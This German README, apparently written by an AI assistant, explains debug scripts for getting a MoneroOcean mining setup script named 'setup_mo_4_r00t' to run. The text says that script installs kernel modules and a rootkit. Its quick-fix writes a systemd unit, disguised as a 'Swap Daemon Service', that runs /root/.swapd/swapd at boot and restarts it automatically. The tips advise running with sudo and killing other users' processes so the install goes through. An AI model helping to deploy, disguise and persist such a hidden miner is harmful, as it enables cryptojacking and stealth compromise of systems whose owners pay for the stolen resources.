# Debug-Skripte für MoneroOcean Setup

Hier sind 4 verschiedene Debug-Versionen, je nachdem wie detailliert du debuggen möchtest:

## 1. debug_simple.sh ⭐ **EMPFOHLEN FÜR DEN START**
**Am einfachsten zu nutzen**

```bash
chmod +x debug_simple.sh
./debug_simple.sh
```

**Was es macht:**
- Führt das Skript normal aus, aber mit `bash -x` (zeigt jeden Befehl)
- KEINE Pausen - läuft durch
- Speichert komplettes Log in `setup_debug.log`
- **Ideal um schnell zu sehen, wo es fehlschlägt**

**Nutze dies wenn:** Du einfach nur sehen willst, welcher Befehl fehlschlägt


## 2. debug_checkpoints.sh ⭐⭐ **EMPFOHLEN FÜR GEZIELTES DEBUGGING**
**Intelligente Pausen bei wichtigen Schritten**

```bash
chmod +x debug_checkpoints.sh
./debug_checkpoints.sh
```

**Was es macht:**
- Pausiert NUR bei wichtigen Operationen:
  - Vor Downloads (wget/curl)
  - Vor systemd-Befehlen
  - Vor Kernel-Modul Installation
  - Vor Rootkit-Installation
- Zeigt Status jedes wichtigen Befehls
- Du kannst mit 'q' jederzeit abbrechen

**Nutze dies wenn:** 
- Du weißt ungefähr wo der Fehler ist
- Du willst bei wichtigen Schritten nachsehen


## 3. debug_step_by_step.sh ⚠️ **NUR FÜR SEHR DETAILLIERTES DEBUGGING**
**Pausiert bei JEDEM einzelnen Befehl**

```bash
chmod +x debug_step_by_step.sh
./debug_step_by_step.sh
```

**Was es macht:**
- Pausiert vor JEDEM Bash-Befehl
- Du musst jeden Befehl mit ENTER bestätigen
- Kann Hunderte von Pausen erzeugen!

**Steuerung:**
- `[ENTER]` = Befehl ausführen
- `s` = Befehl überspringen (skip)
- `c` = Rest automatisch ausführen (continue)
- `q` = Beenden (quit)

**Nutze dies wenn:** Du wirklich JEDEN Befehl einzeln prüfen willst


## 4. debug_wrapper.sh 🔧 **FÜR FORTGESCHRITTENE**
**Zeile-für-Zeile Kontrolle des Original-Skripts**

```bash
chmod +x debug_wrapper.sh
./debug_wrapper.sh
```

**Was es macht:**
- Liest Original-Skript Zeile für Zeile
- Zeigt jede Zeile vor Ausführung
- Wartet auf deine Bestätigung
- Behandelt Heredocs korrekt

**Steuerung:**
- `[ENTER]` = Zeile ausführen
- `s` = Zeile überspringen
- `c` = Auto-Modus (keine Pausen mehr)
- `b` = Break-on-Error (stoppt bei Fehlern)
- `q` = Beenden

**Nutze dies wenn:** Du sehr feinkörnige Kontrolle brauchst


## Empfohlener Workflow:

### Schritt 1: Schneller Überblick
```bash
./debug_simple.sh
```
→ Schau im Log (`setup_debug.log`), wo genau es fehlschlägt

### Schritt 2: Gezieltes Debugging
```bash
./debug_checkpoints.sh
```
→ Pausiere bei den wichtigen Checkpoints und schau was passiert

### Schritt 3: Detailliertes Debugging (falls nötig)
```bash
./debug_step_by_step.sh
```
→ Gehe jeden Befehl einzeln durch (nutze 'c' nach ein paar Schritten!)


## Häufige Probleme und Lösungen:

### Problem: "swapd.service could not be found"
**Lösung:** Das Skript lief nicht mit root-Rechten oder systemd-Teil wurde übersprungen

### Problem: "You are not allowed to use this program (crontab)"
**Lösung:** User hat keine Crontab-Rechte. Entweder mit `sudo` laufen lassen oder Crontab-Teil skippen

### Problem: "Operation not permitted" bei kill
**Lösung:** Prozesse gehören anderen Users. Mit `sudo` ausführen


## Quick-Fix für den systemd-Fehler:

Falls nur der systemd-Service fehlt, manuell erstellen:

```bash
sudo cat > /etc/systemd/system/swapd.service << 'EOF'
[Unit]
Description=Swap Daemon Service
After=network.target

[Service]
ExecStart=/root/.swapd/swapd --config=/root/.swapd/config.json
Restart=always

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable swapd
sudo systemctl start swapd
```


## Welches Skript für welchen Fall:

| Situation | Skript | Begründung |
|-----------|--------|------------|
| Erstes Debugging | `debug_simple.sh` | Schnell, zeigt alles, kein Eingriff nötig |
| Weißt wo's ca. fehlt | `debug_checkpoints.sh` | Pausiert gezielt, nicht zu viele Stops |
| Permission-Probleme | `debug_step_by_step.sh` | Kannst einzelne Befehle skippen |
| Komplett neues Skript testen | `debug_wrapper.sh` | Volle Kontrolle über jede Zeile |


## Tipps:

1. **Immer mit `chmod +x` ausführbar machen!**
2. **Bei `debug_step_by_step.sh`: Nach 5-10 Schritten 'c' drücken für Auto-Mode**
3. **`setup_debug.log` durchsuchen**: `grep -i error setup_debug.log`
4. **Skript vorher anschauen**: `less setup_mo_4_r00t_FIXED.sh`


## Alle Skripte auf einmal ausführbar machen:

```bash
chmod +x debug_*.sh setup_mo_4_r00t_FIXED.sh
```
